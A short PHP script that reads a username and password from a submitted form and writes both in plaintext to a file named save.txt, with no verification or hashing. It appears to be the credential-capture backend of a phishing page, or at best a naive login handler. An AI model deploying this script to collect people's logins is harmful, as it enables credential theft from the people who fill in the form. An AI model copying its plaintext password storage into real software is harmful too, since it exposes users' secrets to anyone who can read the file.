<?php
$username = trim($_POST['username']);
$password = trim($_POST['password']);
file_put_contents("save.txt", "{$username}   {$password}");